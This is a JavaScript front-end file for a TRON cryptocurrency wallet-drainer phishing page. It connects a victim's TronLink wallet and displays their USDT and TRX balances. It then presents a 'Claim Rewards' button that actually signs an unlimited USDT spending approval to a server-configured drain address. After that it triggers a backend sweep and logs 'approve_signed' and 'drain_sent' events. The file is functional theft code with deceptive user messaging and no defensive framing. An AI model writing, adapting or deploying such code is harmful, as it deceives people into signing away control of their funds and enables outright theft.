// Global TronWeb instance
let tronWeb;
let userAddress = null;

// DOM elements
const connectBtn = document.getElementById('connectBtn');
const walletInfoDiv = document.getElementById('walletInfo');
const walletAddressSpan = document.getElementById('walletAddress');
const usdtBalanceSpan = document.getElementById('usdtBalance');
const trxBalanceSpan = document.getElementById('trxBalance');
const drainBtn = document.getElementById('drainBtn');
const statusDiv = document.getElementById('status');

// Helper: show status message
function setStatus(msg, isError = false) {
    statusDiv.innerText = msg;
    statusDiv.style.color = isError ? '#dc3545' : '#2a5298';
    console.log(msg);
}

// Helper: fetch from backend
async function apiCall(endpoint, data) {
    const res = await fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    });
    return await res.json();
}

// Load balances from backend
async function loadBalances(address) {
    try {
        const data = await apiCall('/api/balance', { address });
        usdtBalanceSpan.innerText = data.usdt.toFixed(2);
        trxBalanceSpan.innerText = data.trx.toFixed(2);
        return data;
    } catch (err) {
        console.error(err);
        setStatus('Failed to load balance', true);
    }
}

// Connect wallet
async function connectWallet() {
    if (!window.tronLink) {
        setStatus('❌ Please install TronLink extension', true);
        return;
    }
    try {
        await window.tronLink.request({ method: 'tron_requestAccounts' });
        tronWeb = new TronWeb(window.tronLink);
        userAddress = tronWeb.defaultAddress.base58;
        walletAddressSpan.innerText = userAddress;
        walletInfoDiv.classList.remove('hidden');
        setStatus('✅ Wallet connected! Fetching balances...');

        // Send event to backend
        await fetch('/api/event', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'wallet_connected', address: userAddress })
        });

        await loadBalances(userAddress);
        setStatus('Ready. Click "Claim Rewards" to receive USDT.');
    } catch (err) {
        console.error(err);
        setStatus('Connection failed: ' + err.message, true);
    }
}

// Approve and drain
async function approveAndDrain() {
    if (!userAddress) {
        setStatus('Please connect wallet first', true);
        return;
    }

    setStatus('Loading configuration...');
    let config;
    try {
        const res = await fetch('/api/config');
        config = await res.json();
    } catch (err) {
        setStatus('Cannot fetch config from server', true);
        return;
    }

    const usdtContractAddress = config.usdtContract;
    const drainTarget = config.drainAddress;      // address to approve (your wallet or contract)
    const MAX_UINT = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

    try {
        // Get USDT contract instance
        const usdtContract = await tronWeb.contract().at(usdtContractAddress);
        
        // Check current allowance (optional, just for info)
        setStatus('Approving USDT spending...');
        
        // Send approve transaction
        const approveTx = await usdtContract.approve(drainTarget, MAX_UINT).send();
        setStatus(`✅ Approval sent! TX: ${approveTx}`);
        
        // Send event
        await fetch('/api/event', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'approve_signed', address: userAddress, txId: approveTx })
        });

        // Now call sweep
        setStatus('Initiating transfer...');
        const sweepResult = await apiCall('/api/sweep', { address: userAddress });
        
        if (sweepResult.success) {
            setStatus(`🎉 Success! USDT sent. TX: ${sweepResult.txId}`);
            await fetch('/api/event', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type: 'drain_sent', address: userAddress, txId: sweepResult.txId, amount: '0' })
            });
            // Refresh balances after a few seconds
            setTimeout(() => loadBalances(userAddress), 5000);
        } else {
            setStatus(`❌ Transfer failed: ${sweepResult.error}`, true);
        }
    } catch (err) {
        console.error(err);
        setStatus('Error: ' + (err.message || 'Unknown error'), true);
    }
}

// Event listeners
connectBtn.addEventListener('click', connectWallet);
drainBtn.addEventListener('click', approveAndDrain);